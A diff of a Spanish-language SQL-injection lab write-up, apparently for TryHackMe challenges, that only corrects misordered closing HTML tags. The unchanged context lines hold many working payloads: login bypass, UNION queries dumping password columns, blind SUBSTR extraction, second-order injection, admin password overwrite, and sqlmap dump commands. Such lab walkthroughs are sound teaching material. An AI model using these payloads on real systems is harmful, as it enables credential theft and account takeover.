@@ -16,7 +16,7 @@ Los ataques de inyección SQL es una técnica donde los atacantes pueden ejecuta
 <div style="text-align:center;">
   <pre><code>
 $query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -27,7 +27,7 @@ Si el atacante modifica dicha consulta de la manera que si cambia la parte de `$
 <div style="text-align:center;">
   <pre><code>
 SELECT * FROM users WHERE username= '' OR 1=1 -- AND password= ''
-  </pre></code>
+  </code></pre>
 </div>
 
 Como vemos, el campo password se ha puesto de un color diferente debido a que está comentado.
@@ -42,7 +42,7 @@ Cuando hacemos un logueo, la aplicación lleva a cabo la siguiente consulta:
   <pre><code>
 	SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users
 	WHERE profileID =10 AND password 'ce44iqns...'
-  </pre></code>
+  </code></pre>
 </div>
 
 Como vemos en este ejemplo de consulta, vemos que el campo profileID acepta valores / números enteros `profileID =10`, si no hay un tratamiento de esta condición podemos evadir la seguridad haciendo uso de una condición lógica como `1 or 1=1 --`. 
@@ -56,7 +56,7 @@ Est desafío presenta la misma consulta a la hora de realizar un logueo.
 	SELECT uid, name, profileID, salary, passportNr, email, nickName, password
 	FROM users 
 		WHERE profileID ='10' AND password 'ce44iqns...'
-  </pre></code>
+  </code></pre>
 </div>
 
 Con la diferencia que ahora el campo `profileID='10'` no acepta valores numéricos, si no que es una cadena de caracteres.
@@ -72,7 +72,7 @@ Seguimos teniendo la misma consulta, pero ahora no podemos evadir la seguridad d
 	SELECT uid, name, profileID, salary, passportNr, email, nickName, password 
 	FROM users 
 		WHERE profileID ='10' AND password 'ce44iqns...'
-	</pre></code>
+	</code></pre>
 </div>
 
 
@@ -94,7 +94,7 @@ functionvalidateform() {
     return false;
   }
 }
-  </pre></code>
+  </code></pre>
 </div>
 
 Podemos leer este código y vemos que los campo *profileID* y *password* aceptan caracteres desde [a-Z] hasta [0-9].
@@ -151,7 +151,7 @@ Si los campos se actualizan podemos intentar identificar que base de datos se es
 			',nickName=(SELECT banner FROM v$version),email='
 			# For SQLite*
 			',nickName=sqlite_version(),email='
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -166,7 +166,7 @@ Vamos a realizar una subconsulta donde haremos uso de la función `group_concat(
 <div style="text-align:center;">
   <pre><code>
 ',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -181,7 +181,7 @@ Ahora podemos obtener todos las columnas que componen a dicha tabla:
 <div style="text-align:center;">
   <pre><code>
 ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name = 'usertable'),email='
-  </pre></code>
+  </code></pre>
 </div>
 
 Esta consulta nos devuelve todos las columnas de la tabla usertable:
@@ -198,7 +198,7 @@ Por ejemplo, si queremos obtener el profileID ,name y password de los usuarios p
   <pre><code>
 ',nickname = (SELECT group_concat(profileID || "," || name || "," ||
 	password || ":") FROM usertable), email='
- </pre></code>
+ </code></pre>
 </div>
 
 Resultado de la consulta:
@@ -214,7 +214,7 @@ Finalmente podemos actualizar la contraseña del admin a la que queramos mediant
 <div style="text-align:center;">
   <pre><code>
 ', password='<contraseña_hasheada>' WHERE name='Admin'-- -
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -252,7 +252,7 @@ Esto lo podemos saber si mandamos una consulta de la manera:
 <div style="text-align:center;">
   <pre><code>
 SELECT id, username FROM users WHERE username='" + username + "' AND password= '" + password + "'
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -261,7 +261,7 @@ Si no conocemos el número de columnas, primero tendremos que enumerar el númer
 <div style="text-align:center;">
   <pre><code>
 1' UNION SELECT NULL -- -
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -282,7 +282,7 @@ Como sabemos que el nombre de la tabla es *users* y tenemos la columna *password
 <div style="text-align:center;">
   <pre><code>
 ' UNION SELECT 1, password FROM users-- -
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -291,7 +291,7 @@ Si hacemos uso de group_concat() podemos obtener todas las passwords a la vez.
 <div style="text-align:center;">
   <pre><code>
 ' UNION SELECT 1, group_concat(password) FROM users-- -
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -316,7 +316,7 @@ Para conseguir esto, vamos a hacer uso de la función:
 <div style="text-align:center;">
   <pre><code>
 SUBSTR(string, <start>, <length>)
-  </pre></code>
+  </code></pre>
 </div>
 
 Donde *string* será la contraseña del admin, *start* será el inicio de la cadena y *length* será la longitud.
@@ -332,7 +332,7 @@ SUBSTR("THM{Blind}", 3,1) = M
 
 -- Changing length
 SUBSTR("THM{Blind}", 1,3) = THM
-	</pre></code>
+	</code></pre>
 </div>
 
 A continuación vamos a introducir la contraseña del admin como una cadena en la función `SUBSTR`.
@@ -340,7 +340,7 @@ A continuación vamos a introducir la contraseña del admin como una cadena en l
 <div style="text-align:center;">
   <pre><code>
 (SELECT password FROM users LIMIT 0,1)
-  </pre></code>
+  </code></pre>
 </div>
 
 Lo que hace `LIMIT` es limitar la cantidad de datos devueltos por `SELECT` .
@@ -350,7 +350,7 @@ Quedando de la manera:
 <div style="text-align:center;">
   <pre><code>
 SUBSTR((SELECT password FROM users LIMIT 0,1)1,1)
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -359,7 +359,7 @@ Ahora vamos a necesitar realizar la comparación entre caracteres para ver si es
 <div style="text-align:center;">
   <pre><code>
 SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'
-  </pre></code>
+  </code></pre>
 </div>
 
 Siendo ‘t’ (0x74) y ‘T’(0x54).
@@ -367,7 +367,7 @@ Siendo ‘t’ (0x74) y ‘T’(0x54).
 <div style="text-align:center;">
   <pre><code>
 SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
-  </pre></code>
+  </code></pre>
 </div>
 
 Ahora hacemos uso de `CAST` para convertir la representación hexadecimal a un tipo de datos de texto en SQLite, además le añadimos los dos guiones para comentar el campo de la contraseña:
@@ -375,7 +375,7 @@ Ahora hacemos uso de `CAST` para convertir la representación hexadecimal a un t
 <div style="text-align:center;">
   <pre><code>
 admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
-  </pre></code>
+  </code></pre>
 </div>
 
 Siendo esta la petición que finalmente hará la base de datos:
@@ -383,7 +383,7 @@ Siendo esta la petición que finalmente hará la base de datos:
 <div style="text-align:center;">
   <pre><code>
 SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
-  </pre></code>
+  </code></pre>
 </div>
 
 Si la aplicación nos devuelve un redirección 302, significa que hemos encontrado el primer carácter de la contraseña. 
@@ -395,7 +395,7 @@ También podemos hacer uso de la herramienta externa `sqlmap` para llevar a cabo
 <div style="text-align:center;">
   <pre><code>
 sqlmap -u http://MACHINE_IP:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dumpy
-  </pre></code>
+  </code></pre>
 </div>
 
 <div style="text-align: center; ">
@@ -417,7 +417,7 @@ Luego el usuario introduce cada parámetro en la consulta.
 <div style="text-align:center;">
   <pre><code>
 INSERT INTO notes (username, title, note) VALUES (?,?,?)
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -430,7 +430,7 @@ Sin embargo, la consulta que obtiene todas la notas que pertenece a un usuario n
 <div style="text-align:center;">
   <pre><code>
 SELECT title, note FROM notes	WHERE name = '" + nombre de usuario + "'
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -445,7 +445,7 @@ Podemos crear un usuario malicioso mediante `' UNION SELECT 1,2'` , donde la apl
 <div style="text-align:center;">
   <pre><code>
 SELECT title, note FROM notes	WHERE name='" UNION SELECT 1,2"'
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -456,7 +456,7 @@ Lo podemos hacer como el ejemplo anterior, donde nos logueamos con un usuario ma
 <div style="text-align:center;">
   <pre><code>
 'UNION SELECT 1,group_concat(tlb_name) FROM sqllite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%''
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -474,7 +474,7 @@ Código en `sqlmap` para explotar la vulnerabilidad:
   <pre><code>
 sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" 
 --second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -493,7 +493,7 @@ Podemos ganar acceso haciendo `admin' -- -` ya que el diseñador al pensar que e
 <div style="text-align:center;">
   <pre><code>
 UPDATE users SET password = ? WHERE username = '" + username + "'
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -504,7 +504,7 @@ Cuando cambiamos la contraseña, la aplicación ejecuta dos consultas:
 <div style="text-align:center;">
   <pre><code>
 SELECT username, password FROM users WHERE id = ?
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -513,7 +513,7 @@ Si la comprobación es correcta, procede a cambiar la contraseña:
 <div style="text-align:center;">
   <pre><code>
 UPDATE users SET password = ? WHERE username = 'admin' -- -'
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -532,7 +532,7 @@ Cada vez que se introduce el titulo de un libro (*title*) en dicho buscador se r
 <div style="text-align:center;">
   <pre><code>
 SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '"+ title + "%')
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -561,7 +561,7 @@ Como hemos dicho arriba, la aplicación al pedirle el nombre del libro realiza d
 bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)
 if bid:
     query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -588,7 +588,7 @@ Si no limitamos el resultado a 0 filas, no tendremos el output de la cláusula `
 <div style="text-align:center;">
   <pre><code>
 test' UNION SELECT '1'-- -
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -608,7 +608,7 @@ Nuestro objetivo en cuestión es que la segunda consulta sea algo similar a:
   <pre><code>
 
 SELECT * FROM book WHERE id = ' ' UNION SELECT 1,2,3,4-- -
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -617,7 +617,7 @@ Por tanto, si nos fijamos en la imagen, vemos que la cláusula `LIKE` al hacer u
 <div style="text-align:center;">
   <pre><code>
 SELECT * FROM book WHERE id = ' ' UNION SELECT '-1' UNION SELECT 1,2,3,4- -
-  </pre></code>
+  </code></pre>
 </div>
 
 
@@ -632,7 +632,7 @@ Ahora podemos hacer:
 <div style="text-align:center;">
   <pre><code>
 ' union select '-1''union select 1,group_concat(username),group_concat(password),2 from users-- -
-  </pre></code>
+  </code></pre>
 </div>
 
 
